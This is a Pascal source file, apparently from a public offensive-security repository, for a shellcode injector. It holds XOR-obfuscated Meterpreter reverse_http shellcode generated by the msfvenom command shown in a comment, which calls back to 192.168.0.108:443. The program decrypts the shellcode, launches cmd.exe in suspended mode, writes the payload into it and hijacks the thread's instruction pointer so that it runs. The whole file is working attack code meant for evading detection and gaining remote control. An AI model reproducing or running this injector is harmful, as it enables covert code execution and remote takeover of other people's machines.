{
  this one is part of repo published on github under the name of Offensive Pascal
  Pascal is a great and still up to date :)
  these projects can be compilied using FreePascal (FPC)
  or Delphi
  author : @zux0x3a
  site :   0xsp.com / ired.dev
  https://github.com/0xsp-SRD/OffensivePascal

 }


program injector;

{$mode delphi}


uses

  windows,Classes,strutils,sysutils;

 type
  TByteArray = array of byte;



function Crypt(const aText: byte): tbyte;
const
  PWD = 'a';   // key used for XOR

begin
    result := byte(Ord(aText) xor  Ord(PWD));
end;




procedure inject_shell;
const
 //   msfvenom -p windows/x64/meterpreter/reverse_http LHOST=192.168.0.108 LPORT=443 --encrypt xor --encrypt-key "a" -f c | sed -r 's/[\x]+/$/g' | sed -r 's/[\]+/,/g' | sed -r 's/["]+//g' | sed -e 's/$/\,/' | cut -c 2-

  shellcode:array[0..653] of BYTE = (
$9d,$29,$e2,$85,$91,$89,$ad,$61,$61,$61,$20,$30,$20,$31,$33,
$29,$50,$b3,$30,$37,$04,$29,$ea,$33,$01,$29,$ea,$33,$79,$29,
$ea,$33,$41,$2c,$50,$a8,$29,$ea,$13,$31,$29,$6e,$d6,$2b,$2b,
$29,$50,$a1,$cd,$5d,$00,$1d,$63,$4d,$41,$20,$a0,$a8,$6c,$20,
$60,$a0,$83,$8c,$33,$29,$ea,$33,$41,$ea,$23,$5d,$20,$30,$29,
$60,$b1,$07,$e0,$19,$79,$6a,$63,$6e,$e4,$13,$61,$61,$61,$ea,
$e1,$e9,$61,$61,$61,$29,$e4,$a1,$15,$06,$29,$60,$b1,$ea,$29,
$79,$31,$25,$ea,$21,$41,$28,$60,$b1,$82,$37,$2c,$50,$a8,$29,
$9e,$a8,$20,$ea,$55,$e9,$29,$60,$b7,$29,$50,$a1,$20,$a0,$a8,
$6c,$cd,$20,$60,$a0,$59,$81,$14,$90,$2d,$62,$2d,$45,$69,$24,
$58,$b0,$14,$b9,$39,$25,$ea,$21,$45,$28,$60,$b1,$07,$20,$ea,
$6d,$29,$25,$ea,$21,$7d,$28,$60,$b1,$20,$ea,$65,$e9,$29,$60,
$b1,$20,$39,$20,$39,$3f,$38,$3b,$20,$39,$20,$38,$20,$3b,$29,
$e2,$8d,$41,$20,$33,$9e,$81,$39,$20,$38,$3b,$29,$ea,$73,$88,
$2a,$9e,$9e,$9e,$3c,$29,$50,$ba,$32,$28,$df,$16,$08,$0f,$08,
$0f,$04,$15,$61,$20,$37,$29,$e8,$80,$28,$a6,$a3,$2d,$16,$47,
$66,$9e,$b4,$32,$32,$29,$e8,$80,$32,$3b,$2c,$50,$a1,$2c,$50,
$a8,$32,$32,$28,$db,$5b,$37,$18,$c6,$61,$61,$61,$61,$9e,$b4,
$89,$6f,$61,$61,$61,$50,$58,$53,$4f,$50,$57,$59,$4f,$51,$4f,
$50,$51,$59,$61,$3b,$29,$e8,$a0,$28,$a6,$a1,$da,$60,$61,$61,
$2c,$50,$a8,$32,$32,$0b,$62,$32,$28,$db,$36,$e8,$fe,$a7,$61,
$61,$61,$61,$9e,$b4,$89,$e7,$61,$61,$61,$4e,$38,$29,$2e,$58,
$31,$0e,$4c,$4c,$26,$14,$18,$03,$31,$11,$0e,$59,$4c,$39,$56,
$05,$25,$30,$50,$08,$13,$37,$56,$0a,$03,$15,$3e,$0e,$58,$0c,
$20,$33,$37,$2a,$2b,$00,$26,$3b,$28,$0a,$29,$0a,$06,$2c,$13,
$29,$24,$37,$16,$1b,$2b,$4c,$05,$26,$30,$02,$22,$20,$54,$2f,
$0b,$16,$59,$33,$29,$50,$31,$02,$0a,$0f,$0e,$30,$2c,$2d,$08,
$14,$2e,$20,$57,$07,$07,$03,$0a,$23,$0a,$10,$35,$2e,$55,$05,
$0c,$26,$00,$35,$2b,$2a,$59,$2a,$3e,$28,$18,$04,$2a,$09,$52,
$0b,$27,$0b,$38,$57,$39,$2e,$1b,$52,$34,$07,$17,$0c,$55,$3e,
$2e,$13,$2c,$0d,$3b,$35,$39,$00,$61,$29,$e8,$a0,$32,$3b,$20,
$39,$2c,$50,$a8,$32,$29,$d9,$61,$63,$49,$e5,$61,$61,$61,$61,
$31,$32,$32,$28,$a6,$a3,$8a,$34,$4f,$5a,$9e,$b4,$29,$e8,$a7,
$0b,$6b,$3e,$32,$3b,$29,$e8,$90,$2c,$50,$a8,$2c,$50,$a8,$32,
$32,$28,$a6,$a3,$4c,$67,$79,$1a,$9e,$b4,$e4,$a1,$14,$7e,$29,
$a6,$a0,$e9,$72,$61,$61,$28,$db,$25,$91,$54,$81,$61,$61,$61,
$61,$9e,$b4,$29,$9e,$ae,$15,$63,$8a,$ad,$89,$34,$61,$61,$61,
$32,$38,$0b,$21,$3b,$28,$e8,$b0,$a0,$83,$71,$28,$a6,$a1,$61,
$71,$61,$61,$28,$db,$39,$c5,$32,$84,$61,$61,$61,$61,$9e,$b4,
$29,$f2,$32,$32,$29,$e8,$86,$29,$e8,$90,$29,$e8,$bb,$28,$a6,
$a1,$61,$41,$61,$61,$28,$e8,$98,$28,$db,$73,$f7,$e8,$83,$61,
$61,$61,$61,$9e,$b4,$29,$e2,$a5,$41,$e4,$a1,$15,$d3,$07,$ea,
$66,$29,$60,$a2,$e4,$a1,$14,$b3,$39,$a2,$39,$0b,$61,$38,$28,
$a6,$a3,$91,$d4,$c3,$37,$9e,$b4,$00);

var
  pi: TProcessInformation;
  si: TStartupInfo;
  {$ifdef win32}
  ctx: Context;
  {$endif}

  {$ifdef win64}
  ctx : Pcontext;
  {$endif}
  remote_shellcodePtr: Pointer;
  {$ifdef win64}
  Written:dword64;
  {$endif}
   {$ifdef win32}
  Written:dword;
  {$endif}
  AppToLaunch: string;
  i ,s_size: Cardinal;
  tmp :  array of byte;
  len: integer;


begin

// get length of shellcode
len := length(shellcode);
writeln('size of shellcode ', len);

// set array of byte length to match size of shellcode
setlength(tmp,len);

writeln('[+] Decrypting shellcode');
      for i := 0 to len -1 do begin
          tmp[i] := crypt(shellcode[i]);  // process of decryption
       end;

AppToLaunch := 'notepad.exe';
UniqueString(AppToLaunch);

FillMemory( @si, sizeof( si ), 0 );
FillMemory( @pi, sizeof( pi ), 0 );

writeln('[+] Creating Process in Suspended Mode');

CreateProcess('c:\windows\system32\cmd.exe', PChar(AppToLaunch), nil, nil, False,
              CREATE_SUSPENDED,
              nil, nil,  si, pi );



 {$ifdef win32}
 ctx.ContextFlags := CONTEXT_CONTROL;
 GetThreadContext(pi.hThread,ctx);
 {$endif}

 {$ifdef win64}
  ctx := PCONTEXT(VirtualAlloc(nil, sizeof(ctx), MEM_COMMIT, PAGE_READWRITE));
  ctx.ContextFlags := CONTEXT_ALL;
  GetThreadContext(pi.hThread,ctx^);
 {$endif}


 //allocate the memory size
 remote_shellcodePtr:=VirtualAllocEx(pi.hProcess,Nil,s_size,MEM_COMMIT,
   PAGE_EXECUTE_READWRITE);




 // decryption section start here



 // write array of bytes into process memory
 WriteProcessMemory(pi.hProcess,remote_shellcodePtr,Tbytearray(tmp),s_size,written);


{$ifdef win64}
 ctx.rip:=dword64(remote_shellcodePtr);
 //ctx.ContextFlags := CONTEXT_CONTROL;
 SetThreadContext(pi.hThread,ctx^);
 ResumeThread(pi.hThread);
{$ENDIF}

{$ifdef win32}
 ctx.Eip:=integer(remote_shellcodePtr);
 ctx.ContextFlags := CONTEXT_CONTROL;
 SetThreadContext(pi.hThread,ctx);

 ResumeThread(pi.hThread);
{$endif}


 end;



begin
  inject_shell;

end.

